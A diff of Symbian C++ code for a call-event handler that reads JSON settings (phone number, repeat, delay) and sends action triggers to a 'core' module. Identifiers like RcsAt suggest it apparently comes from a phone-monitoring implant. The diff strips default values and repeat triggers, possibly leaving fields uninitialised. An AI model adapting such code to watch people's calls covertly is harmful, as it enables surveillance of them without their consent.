@@ -60,22 +60,20 @@ void CEventCall::ConstructL(const TDesC8& params)
 	paramsBuf.CleanupClosePushL();
 	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
 	CleanupStack::PushL(jsonBuilder);
-	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf); 
 	CJsonObject* rootObject;
 	jsonBuilder->GetDocumentObject(rootObject);
 	if(rootObject)
 		{
 		CleanupStack::PushL(rootObject);
 		//retrieve telephone number
-		rootObject->GetStringL(_L("number"),iTelNumber);
+		if(rootObject->Find(_L("number")) != KErrNotFound)
+			rootObject->GetStringL(_L("number"),iTelNumber);
+		else
+			iTelNumber.Copy(KNullDesC); 
 		//retrieve exit action
 		if(rootObject->Find(_L("end")) != KErrNotFound)
-			{
 			rootObject->GetIntL(_L("end"),iCallParams.iExitAction);
-			}
-		else
-			iCallParams.iExitAction = -1;
-			
 		//retrieve repeat action
 		if(rootObject->Find(_L("repeat")) != KErrNotFound)
 			{
@@ -84,19 +82,9 @@ void CEventCall::ConstructL(const TDesC8& params)
 			//iter
 			if(rootObject->Find(_L("iter")) != KErrNotFound)
 				rootObject->GetIntL(_L("iter"),iCallParams.iIter);
-			else 
-				iCallParams.iIter = -1;
 			//delay
 			if(rootObject->Find(_L("delay")) != KErrNotFound)
 				rootObject->GetIntL(_L("delay"),iCallParams.iDelay);
-			else 
-				iCallParams.iDelay = -1;
-			}
-		else
-			{
-			iCallParams.iRepeatAction = -1;
-			iCallParams.iIter = -1;
-			iCallParams.iDelay = -1;
 			}
 		//retrieve enable flag
 		rootObject->GetBoolL(_L("enabled"),iEnabled);
@@ -140,10 +128,6 @@ void CEventCall::StartEventL()
 				iTimeAtRepeat.HomeTime();
 				iTimeAtRepeat += iSecondsIntervRepeat;
 				iTimerRepeat->RcsAt(iTimeAtRepeat);
-						
-				--iIter;
-						
-				SendActionTriggerToCoreL(iCallParams.iRepeatAction);
 				}
 			}
 		else					
@@ -164,10 +148,6 @@ void CEventCall::StartEventL()
 					iTimeAtRepeat.HomeTime();
 					iTimeAtRepeat += iSecondsIntervRepeat;
 					iTimerRepeat->RcsAt(iTimeAtRepeat);
-							
-					--iIter;
-							
-					SendActionTriggerToCoreL(iCallParams.iRepeatAction);
 					}
 				}
 			}
@@ -201,10 +181,6 @@ void CEventCall::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirectio
 				iTimeAtRepeat.HomeTime();
 				iTimeAtRepeat += iSecondsIntervRepeat;
 				iTimerRepeat->RcsAt(iTimeAtRepeat);
-									
-				--iIter;
-									
-				SendActionTriggerToCoreL(iCallParams.iRepeatAction);
 				}
 			}
 		else
@@ -226,10 +202,6 @@ void CEventCall::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirectio
 					iTimeAtRepeat.HomeTime();
 					iTimeAtRepeat += iSecondsIntervRepeat;
 					iTimerRepeat->RcsAt(iTimeAtRepeat);
-										
-					--iIter;
-										
-					SendActionTriggerToCoreL(iCallParams.iRepeatAction);
 					}
 				}
 			}
